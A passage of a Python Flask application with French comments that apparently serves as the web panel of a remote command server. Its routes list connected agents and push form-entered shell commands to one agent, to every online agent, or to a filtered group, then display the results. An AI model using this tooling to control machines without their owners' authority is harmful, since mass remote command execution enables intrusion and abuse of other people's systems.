            # Libération du lock, assurant la poursuite normale du programme
            lock.release()

        # Démarrage du thread principal du serveur pour accepter les connexions entrantes
        threading.Thread(target=srv_scket, daemon=True).start()
        # Démarrage du thread KeepAlive pour vérifier périodiquement la présence des agents
        threading.Thread(target=KeepAlive, daemon=True).start()
        # Démarrage du thread de nettoyage des connexions inactives
        threading.Thread(target=cleanup_inactive_connections, daemon=True).start()
        # Indiquer que le serveur a été démarré, pour éviter un démarrage multiple
        server_started = True


# =============================================================================
# Fonctions utilitaires pour les pages web
# =============================================================================

@app.route("/")
def home():
    return render_template('index.html')


@app.route("/accueil")
def accueil():
    return render_template('index.html')


@app.route("/agents")
def agents():
    global THREADS, Ips, State, Info, ID
    recupinfo()
    return render_template('agents.html', id=ID, ips=Ips, state=State, infoIP=Info)


@app.route("/agentsinfo")
def agentsinfo():
    recupinfo()
    return render_template('agentsinfo.html', id=ID, ips=Ips, state=State, infoIP=Info)


@app.route("/allinone/executecmd")
def allinoneexecutecmd():
    return render_template("allinone.html")


@app.route("/allinone/executeall", methods=['GET', 'POST'])
def allinone():
    global CMD_IN
    recupinfo()
    if request.method == 'POST':
        cmd = request.form['command']
        for i in ID:
            idx = ID.index(i)
            if State[idx] == "online":
                while CMD_IN[i] != '':
                    print(f"Commande déjà en cours pour agent {i}, attente...")
                    time.sleep(0.5)
                CMD_IN[i] = cmd
        time.sleep(2)
    return render_template('allinone.html')


@app.route("/agentsfiltre")
def agentsfiltre():
    return render_template("agentsfiltre.html")


@app.route("/executefiltre", methods=['GET', 'POST'])
def executefiltre():
    global Ips, State, Info, ID, Filtre
    recupinfo()
    if request.method == 'POST':
        Filtre = request.form['command']
    return render_template("agentsfiltreaffichage.html", filtre=Filtre, id=ID, ips=Ips, state=State, infoIP=Info)


@app.route("/executefiltrecmd", methods=['GET', 'POST'])
def executefiltrecmd():
    global CMD_IN, State, Info, ID, Filtre
    if request.method == 'POST':
        cmd = request.form['command']
        for i in ID:
            idx = ID.index(i)
            if State[idx] == "online" and Filtre in Info[idx]:
                while CMD_IN[i] != '':
                    print(f"Commande déjà en cours pour agent {i}, attente...")
                    time.sleep(0.5)
                CMD_IN[i] = cmd
        time.sleep(2)
    return render_template("agentsfiltreaffichage.html", filtre=Filtre, id=ID, ips=Ips, state=State, infoIP=Info)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html", name=agentname)


@app.route("/<agentname>/execute", methods=['GET', 'POST'])
def execute(agentname):
    global CMD_IN, CMD_OUT, ID, req_index
    if request.method == 'POST':
        cmd = request.form['command']
        req_index = -1
        for i in ID:
            if str(i) == agentname:
                req_index = int(i)
                break
        if req_index == -1:
            return f"Agent {agentname} non trouvé.", 404

        while CMD_IN[req_index] != '':
            print(f"Commande en cours pour agent {agentname}, attente...")
            time.sleep(0.5)

        CMD_IN[req_index] = cmd
        time.sleep(6)
        cmdoutput = CMD_OUT[req_index]
        return render_template('execute.html', cmdoutput=cmdoutput, name=agentname)

    return render_template("execute.html", name=agentname)


# =============================================================================
# Fonction utilitaire pour lancer l'application PyQt6
# ============================================================================= 

def lancer_gui():
    GUI.main()  # Crée une fonction main() dans GUI.py qui lance l'application PyQt6


# =============================================================================
# Fonction principale pour lancer l'application
# =============================================================================

if __name__ == "__main__":
    # # Lancer GUI seulement si le script est lancé manuellement, pas au redémarrage de Flask

    # Lancement du serveur Flask
    app.run(debug=True, use_reloader=False)  # Désactive le reloader automatique


    # Cela permet à Flask : 
    #  - d'écouter les requêtes provenant de n'importe quelle machine du réseau local (pas juste 127.0.0.1),
    #  - de devenir actif dès qu’un client se connecte sans attendre une requête locale depuis le navigateur.

    # app.run(host="0.0.0.0", port=5001, debug=True)

